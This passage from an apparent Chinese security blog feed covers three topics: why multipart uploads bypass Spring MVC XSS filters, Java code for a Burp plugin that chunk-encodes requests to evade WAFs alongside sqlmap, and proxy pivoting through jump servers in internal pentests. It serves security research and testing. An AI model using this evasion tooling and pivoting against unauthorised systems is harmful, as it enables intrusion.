class="keyword">private</span> <span class="keyword">void</span> <span class="title">processParameters</span><span class="params">(<span class="keyword">byte</span>[] bytes, <span class="keyword">int</span> start, <span class="keyword">int</span> len, Charset charset)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">int</span> decodeFailCount = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> pos = start;</span><br><span class="line">      <span class="keyword">int</span> end = start + len;</span><br><span class="line"></span><br><span class="line">      label172:</span><br><span class="line">      <span class="keyword">while</span>(pos &lt; end) &#123;</span><br><span class="line">          <span class="keyword">int</span> nameStart = pos;</span><br><span class="line">          <span class="keyword">int</span> nameEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueStart = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parsingName = <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeName = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeValue = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parameterComplete = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="keyword">switch</span>(bytes[pos]) &#123;</span><br><span class="line">              <span class="comment">/*如果遇到%(37)和+(43),会对值进行进行URL解码*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">              <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      decodeName = <span class="keyword">true</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      decodeValue = <span class="keyword">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到的&amp;(38)，标记该处为参数名和参数值结尾*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      valueEnd = pos;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  parameterComplete = <span class="keyword">true</span>;</span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到=(61)，标记该处为参数名的结尾，参数值的开始处*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">61</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                      parsingName = <span class="keyword">false</span>;</span><br><span class="line">                      ++pos;</span><br><span class="line">                      valueStart = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      ++pos;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                  ++pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">while</span>(!parameterComplete &amp;&amp; pos &lt; end);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (pos == end) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nameEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  nameEnd = pos;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valueStart &gt; -<span class="number">1</span> &amp;&amp; valueEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  valueEnd = pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>至此，Tomcat层面对前端请求解析工作结束。接下来Spring MVC会收到Tomcat传来的<code>HttpServletRequest</code>，此时若请求为上传POST型，Spring MVC会继续调用<code>commons-fileuplad.jar</code>对Tomcat传来的原生Servlet请求类<code>HttpServletRequest</code>的实例进行解析处理。</p><p>Spring MVC将原生的<code>HttpServletRequest</code>对象传入<code>CommonsMultipartResolver</code>类的<code>parseRequest()</code>方法进行解析处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsMultipartResolver.parseRequest.png" alt="CommonsMultipartResolver类parseRequest()方法"></p><p><code>CommonsMultipartResolver.parseRequest()</code>方法主要分两步对上传请求进行解析。</p><ul><li>第一步，调用<code>commons-fileupload.jar</code>中的<code>ServletFileUpload</code>类的<code>parseRequest()</code>方法来解析出保存有上传表单各个元素的<code>FileItem</code>列表。</li><li>第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>方法解析<code>FileItem</code>列表为保存有表单字段名，字段值等信息<code>MultipartParsingResult</code>类型的<code>Map</code>。</li></ul><p>下面我们来看下这两步的执行细节。首先第一步最终的处理方法为<code>FileUploadBase.parseRequest()</code></p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileUploadBase.parseRequest.png" alt="FileUploadBase类parseRequest()方法"></p><p><code>FileUploadBase.parseRequest()</code>解析完会返回一个<code>FileItem</code>实例列表。<code>FileItem</code>就是存储着上传表单的各种元素（字段名，ContentType，是否是简单表单字段，文件名。）本例中我们提交的上传表单的<code>FileItem</code>内容如下：</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileItem.png" alt="FileItem实例对象"></p><p>接着来到第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>对<code>commons-fileupload.jar</code>处理的结果—FileItem列表，进行处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsFileUploadSupport.parseFileItems.png" alt="CommonsFileUploadSupport类parseFileItems()方法"></p><p>最后将上传表单解析的所有元素（multipartFiles，multipartParameters，multipartParameterContentTypes）封装为一个<code>MultipartParsingResult</code>并返回。至此上传POST型请求的解析工作完成。</p><p>最后Spring MVC，会使用<code>HandlerMethodInvoker.resolveRequestParam()</code>方法，将解析好的请求参数的值，绑定到不同的对象上，方便Controller层获取。具体我们在下面说。</p><h4 id="3-2-上传包无法被过滤的原理"><a href="#3-2-上传包无法被过滤的原理" class="headerlink" title="3.2 上传包无法被过滤的原理"></a>3.2 上传包无法被过滤的原理</h4><p>上面我们用较大边幅说明了Spring MVC是如何获取到前端发来的请求的参数值。下面我们就很好理解，问题的所在了。</p><p>经过跟踪发现，Spring MVC对各类型请求参数的解析并实现自动绑定，主要在<code>HandlerMethodInvoker.resolveRequestParam()</code>方法。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/HandlerMethodInvoker.resolveRequestParam.png" alt="HandlerMethodInvoker类resolveRequestParam()方法"></p><p>继续跟进到获取参数值的那一步。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/ServletWebRequest.getParameterValues.png" alt="ServletWebRequest类getParameterValues()方法"></p><p>通过调式发现，这里如果是GET型和普通POST型请求的话，<code>getRequest()</code>获取到的对象是我们编写的过滤类<code>XssHttpServletRequestWrapper</code>的实例，故调用该对象<code>getParameterValues()</code>来获取值，自然是被过滤了！</p><p>若是上传POST行请求的话，<code>getRequest()</code>获取到的是<code>CommonsMultipartResolver</code>类的对象。但实际上调用该对象的<code>getParamterValues()</code>方法，会执行到<code>DefaultMultipartHttpServletRequest</code>类的<code>getParamterValues()</code>类获取值。这是调式发现的，我暂时也没有搞清楚为何，不过不影响我们解决本次研究的问题。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.getParameterValues.png" alt="DefaultMultipartHttpServletRequest类的getParameterValues方法"></p><p>到这里我们基本明白了，上传包中的参数值没有被过滤，是因为Spring MVC在解析上传包获取其参数值时，没有使用我们编写的过滤类<code>XssHttpServletRequestWrapper</code>中的<code>getParamterValues()</code>方法，而是使用了<code>DefaultMultipartHttpServletRequest</code>类<code>getParamterValuses()</code>。</p><p><strong>你可能有疑问，为何SpringMVC获取上传POST请求的参数值时，为啥不调用XssHttpServletRequestWrapper.getParamterValues()来获取呢？</strong></p><p><strong>答：因为这样获取不到。</strong></p><p>借助以下相关类和接口的继承实现关系图，我们继续看看为何获取不到。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.png" alt="相关类和接口的继承实现关系"></p><p>结合我们上面对Spring MVC和Tomcat如何解析到请求包的参数值的过程，知道GET型和普通POST型请求包是可以通过<code>HttpServletRequest.getParameterValues()</code>直接获取到对应参数的值，而通过图中可知<code>XssHttpServletRequestWrapper</code>实现了<code>HttpServletRequest</code>，自然也是可以通过<code>XssHttpServletRequestWrapper.getParameterValues()</code>获取到的。</p><p>但上传包Tomcat默认没有解析，根据继承关系<code>XssHttpServletRequestWrapper</code>对象中保存的解析结果为Tomcat解析请求的结果，故通过该对象的<code>getParameterValues()</code>方法获取到的参数值为<code>null</code>。也是因此Spring MVC针对Tomcat解析的结果—原生<code>HttpServletRequest</code>，使用<code>common-fileupload.jar</code>来继续解析，得到<code>MultipartHttpServletRequest</code>的实现对象。<code>DefaultMultipartHttpServletRequest</code>类实现了<code>MultipartHttpServletRequest</code>，故通过该类的<code>getParameterValues()</code>方法即可获取到上传POST请求的参数值！</p><p><strong>最后特别说明一点，其实上传POST请求数据是流经过过滤器的。没有被过滤，是由于获取参数值的时候，没有调用过滤器Wrapper对象的方法。所以最终我们看到了上传包可以“绕过”过滤器检查的现象。</strong></p><h2 id="0x05-最后的思考"><a href="#0x05-最后的思考" class="headerlink" title="0x05 最后的思考"></a>0x05 最后的思考</h2><p>在文章发布区，评论区，公告区….等功能点上常常需要上传图片或附件，这时表单往往会以上传包的形式提交数据。而这些功能点也是hack们最关注的XSS漏洞测试点，若不注意上传包可”绕过”过滤器的问题，会造成很严重的后果！</p><p>我从新翻开了之前审计的项目代码，发现很多Spring MVC项目都是使用过滤器对XSS和SQL注入进行全局防御。而过滤器的代码与本文例子的中过滤器代码相似，很明显都是从网上Copy过来的。这样编写代码是存在问题的，针对这种情况，我们该如何正确防御，我们下周文章详述！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局
      
    
    </summary>
    
      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>编写Burp分块传输插件绕WAF</title>
    <link href="http://gv7.me/articles/2019/chunked-coding-converter/"/>
    <id>http://gv7.me/articles/2019/chunked-coding-converter/</id>
    <published>2019-03-15T02:37:13.000Z</published>
    <updated>2019-12-16T17:37:02.680Z</updated>
    
    <content type="html"><![CDATA[<p>分块传输绕WAF在年初的<a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">《利用分块传输吊打所有WAF》</a>中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入<code>Transfer-Encoding: chunked</code>HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！</p><a id="more"></a><h2 id="0x01-功能设计"><a href="#0x01-功能设计" class="headerlink" title="0x01 功能设计"></a>0x01 功能设计</h2><p>我们先来看看插件要实现的功能</p><ol><li>在Burp Repeater套件上可对数据包进行快速chunked解码编码</li><li>自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码</li><li>可设置分块长度，是否开启注释</li></ol><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>限于边幅，我只说明核心函数，并通过注释的方式解释代码的相关功能。</p><h4 id="2-1-编码函数"><a href="#2-1-编码函数" class="headerlink" title="2.1 编码函数"></a>2.1 编码函数</h4><p>这是我们的核心函数，对各个套件数据HTTP数据进行<code>chunked</code>编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">byte</span>[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, <span class="keyword">int</span> split_len, <span class="keyword">boolean</span> isComment) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = requestResponse.getRequest();</span><br><span class="line">IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line"><span class="keyword">int</span> bodyOffset = requestInfo.getBodyOffset();</span><br><span class="line"><span class="keyword">int</span> body_length = request.length - bodyOffset;</span><br><span class="line">String body = <span class="keyword">new</span> String(request, bodyOffset, body_length, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">// 对长度大于10000的数据包，不处理</span></span><br><span class="line"><span class="keyword">if</span> (request.length - bodyOffset &gt; <span class="number">10000</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对数据包进行编码处理</span></span><br><span class="line">List&lt;String&gt; str_list = Util.getStrList(body,Config.splite_len);</span><br><span class="line">String encoding_body = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>(String str:str_list)&#123;</span><br><span class="line"><span class="keyword">if</span>(Config.isComment)&#123;</span><br><span class="line">encoding_body += String.format(<span class="string">"%s;%s"</span>,Util.decimalToHex(str.length()),Util.getRandomString(<span class="number">10</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">encoding_body += Util.decimalToHex(str.length());</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">encoding_body += str;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"0\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在数据包中添加Transfer-Encoding: chunked头</span></span><br><span class="line">List&lt;String&gt; headers = helpers.analyzeRequest(request).getHeaders();</span><br><span class="line">Iterator&lt;String&gt; iter = headers.iterator();</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"><span class="keyword">if</span> (((String)iter.next()).contains(<span class="string">"Transfer-Encoding"</span>)) &#123;</span><br><span class="line">iter.remove();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">headers.add(<span class="string">"Transfer-Encoding: chunked"</span>);</span><br><span class="line"><span class="keyword">return</span> helpers.buildHttpMessage(headers,encoding_body.getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自动编码其他模块的数据包，我们可以通过实现Burp的<code>IHttpListener</code>，<code>IProxyListener</code>这两个接口，分别实现<code>processHttpMessage()</code>，<code>processProxyMessage()</code>这两个方法。</p><p>这里注意一个问题，Burp的所有模块的HTTP流量都会经过<code>IHttpListener.processHttpMessage()</code>这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用<code>IProxyListener.processProxyMessage()</code>。</p><h4 id="2-2-自动编码Proxy套件的流量"><a href="#2-2-自动编码Proxy套件的流量" class="headerlink" title="2.2 自动编码Proxy套件的流量"></a>2.2 自动编码Proxy套件的流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processProxyMessage</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> messageIsRequest, <span class="keyword">final</span> IInterceptedProxyMessage proxyMessage)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"><span class="comment">//只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码</span></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//使用encoding方法对原请求包进行chunked编码</span></span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//将原HTTP请求包替换为chunked编码后的请求包</span></span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量"><a href="#2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量" class="headerlink" title="2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量"></a>2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Proxy套件流量不处理，否则会出现两次编码问题，其余套件均在这里处理。</span></span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(toolFlag) &amp;&amp; (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码，已经上传github，地址如下：</p><p><a href="http://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">http://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x03-效果演示"><a href="#0x03-效果演示" class="headerlink" title="0x03 效果演示"></a>0x03 效果演示</h2><h4 id="3-1-演示一：快速编码解码"><a href="#3-1-演示一：快速编码解码" class="headerlink" title="3.1 演示一：快速编码解码"></a>3.1 演示一：快速编码解码</h4><p>在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试。</p><p><img src="/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif" alt="快速编码解码对WAF进行测试"></p><h4 id="3-2-演示二：搭配sqlmap进行sql注入"><a href="#3-2-演示二：搭配sqlmap进行sql注入" class="headerlink" title="3.2 演示二：搭配sqlmap进行sql注入"></a>3.2 演示二：搭配sqlmap进行sql注入</h4><p>sqlmap代理到Burp中，插件对Proxy套件的流量进行编码处理，来绕过waf。</p><p><img src="/articles/2019/chunked-coding-converter/sqlmap-bypassWAF.gif" alt="搭配sqlmap绕waf"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;分块传输绕WAF在年初的&lt;a href=&quot;https://www.anquanke.com/post/id/169738&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《利用分块传输吊打所有WAF》&lt;/a&gt;中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入&lt;code&gt;Transfer-Encoding: chunked&lt;/code&gt;HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="burp" scheme="http://gv7.me/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>突破内网渗透中的访问策略限制</title>
    <link href="http://gv7.me/articles/2019/break-through-lan-segment-limit/"/>
    <id>http://gv7.me/articles/2019/break-through-lan-segment-limit/</id>
    <published>2019-02-25T10:50:11.000Z</published>
    <updated>2019-03-15T03:38:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。</p><h2 id="0x01-场景说明"><a href="#0x01-场景说明" class="headerlink" title="0x01 场景说明"></a>0x01 场景说明</h2><p>在做安服驻场时，连入客户内网对另一网段的站点进行渗透。有可能会遇到这种情况，虽然连入了客户内网，但无法直接访问目标站点。因为客户内网做了访问策略限制，不同网段无法直接连通。往往需要通过客户提供的跳板服务器去访问，大概的网络示意图如下：</p><p><img src="/articles/2019/break-through-lan-segment-limit/network.png" alt="网络示意图"></p><p>我们当然可以在跳板服务器上装好java环境，方便运行比配的Burp Suite。安装python环境，运行常用的渗透辅助脚本。同时如果你还需要其他工具，得一个一个复制到服务器上……这将非常的繁琐！</p><p><strong>那不能通过某种方法可以使得我们的笔记本直接访问的目标站点呢？</strong>，这样就不用拷贝工具到服务器上了，毕竟还是自己的笔记本渗透舒适。本文就是用于解决这个问题。</p><h2 id="0x02-方案一-HTTP代理"><a href="#0x02-方案一-HTTP代理" class="headerlink" title="0x02 方案一: HTTP代理"></a>0x02 方案一: HTTP代理</h2><h3 id="2-1-跳板服务器配置"><a href="#2-1-跳板服务器配置" class="headerlink" title="2.1 跳板服务器配置"></a>2.1 跳板服务器配置</h3><p>在跳板服务器上搭建Http(s)代理服务器，由于比较简单，就不具体说明如何搭建了。</p><h3 id="2-2-笔记本配置"><a href="#2-2-笔记本配置" class="headerlink" title="2.2 笔记本配置"></a>2.2 笔记本配置</h3><p>在客户端的浏览器上配置好代理，即可访问目标站点了。</p><h3 id="2-3-方案缺点"><a href="#2-3-方案缺点" class="headerlink" title="2.3 方案缺点"></a>2.3 方案缺点</h3><p>只能支持Http协议数据的转发，无法代理其他协议。导致我们无法测试目标站点的其他端口。下个方案我们来解决这个问题。</p><h2 id="0x03-方案二：Shadowsocks"><a href="#0x03-方案二：Shadowsocks" class="headerlink" title="0x03 方案二：Shadowsocks"></a>0x03 方案二：Shadowsocks</h2><p>我们往往都是使用Shadowsocks来FQ，其实这种场景也是可以利用<code>Shadowsocks</code>来解决的。</p><h3 id="3-1-跳板服务器配置"><a href="#3-1-跳板服务器配置" class="headerlink" title="3.1 跳板服务器配置"></a>3.1 跳板服务器配置</h3><p>Shadowsocks有python版，nodejs版，go版和exe版。由于我们得到的跳板机一般为Windows，故这里选择绿色单exe版Shadowsocks,方便携带移动。下载地址如下：</p><p><a href="https://github.com/shadowsocks/libQtShadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks</a></p><p>新建以下两个文件，内容分别如下：</p><p><strong>shadowsock.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line"><span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line"><span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line"><span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line"><span class="attr">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line"><span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line"><span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>shadowsock-server.bat</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure><p>将以上两个文件放到与<code>shadowsocks-libqss.exe</code>文件同目录，双击运行该bat脚本，即可在服务器上一键启动Shadowsocks了！</p><h3 id="3-2-笔记本配置"><a href="#3-2-笔记本配置" class="headerlink" title="3.2 笔记本配置"></a>3.2 笔记本配置</h3><p>在我们的笔记本Shadowsocks客户端进行如下设置，即可连接到Shadowsocks服务器。</p><p><img src="/articles/2019/break-through-lan-segment-limit/shadowsock-client-config.png" alt="ss客户端配置"></p><p>在渗透时只需要将浏览器,burp等工具代理到<code>127.0.0.1:1080</code>，即可访问到我们的目标站点了。</p><p>注意：只有实现了http(s)/socks5功能或者使用系统代理的工具才能使用Shadowsocks！</p><h3 id="3-3-方案缺点"><a href="#3-3-方案缺点" class="headerlink" title="3.3 方案缺点"></a>3.3 方案缺点</h3><p>如果某个渗透测试工具本身没有http(s)/socks5代理功能，那该怎么办？也许有的朋友可能会想到使用<code>Proxifier/Sockcap</code>这类软件，来为这些软件进程“添加”代理功能。但是由于ss需要在本地有客户端，故在本地再使用Proxifier/Sockcap会出现流量传输死循环的情况。下个方案我们来解决这个问题。</p><h2 id="0x04-方案三：SOCKS5代理-Proxifier-Sockcap"><a href="#0x04-方案三：SOCKS5代理-Proxifier-Sockcap" class="headerlink" title="0x04 方案三：SOCKS5代理+Proxifier/Sockcap"></a>0x04 方案三：SOCKS5代理+Proxifier/Sockcap</h2><h3 id="4-1-跳板服务器配置"><a href="#4-1-跳板服务器配置" class="headerlink" title="4.1 跳板服务器配置"></a>4.1 跳板服务器配置</h3><p>这里我们使用绿色单exe版SOCKS5代理服务器软件goproxy，项目地址如下：</p><p><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p>在跳板服务器上，使用以下命令即可快速启动SOCKS5代理服务。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy.exe socks -t tcp -p "<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">38080</span>"</span><br></pre></td></tr></table></figure><h3 